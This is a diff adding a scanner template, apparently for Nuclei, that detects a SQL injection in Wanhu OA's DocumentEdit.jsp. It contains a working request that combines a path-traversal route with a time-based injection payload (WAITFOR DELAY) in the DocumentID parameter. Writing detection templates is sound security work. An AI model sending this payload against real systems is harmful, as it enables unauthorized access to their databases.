@@ -1,0 +1,25 @@
+id: wanhuoa-documentedit-sqlinjection
+
+info:
+  name: 万户OA DocumentEdit.jsp SQL注入
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects SQL Injection vulnerability in 万户OA DocumentEdit.jsp by leveraging a time-based payload.
+  tags: sql-injection, time-based
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'--"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "HTML V6"
